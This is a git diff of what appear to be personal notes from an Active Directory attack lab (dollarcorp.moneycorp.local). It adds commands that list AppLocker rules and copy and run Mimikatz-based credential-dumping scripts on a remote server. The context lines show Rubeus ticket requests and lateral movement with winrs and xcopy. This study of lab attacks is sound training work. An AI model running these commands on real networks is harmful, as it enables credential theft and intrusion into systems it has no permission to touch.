@@ -22,6 +22,11 @@ $null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
 ```
 
 ### Lateral 1
+Review AppLocker settings
+```powershell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
 Add port forward to machine to forwards to webserver - downloading executable is bad
 ```powershell
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
@@ -43,6 +48,17 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin 
 This will create a logon type 9 so the new credentials will only be used when accessing domain resources
 
 ### Lateral 2 
+Review AppLocker settings
 ```powershell
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
 
+
+```powershell
+Copy-Item C:\AD\Tools\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+
+Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+
+.\Invoke-MimiEx-keys.ps1
+.\Invoke-MimiEx-vault.ps1
 ```
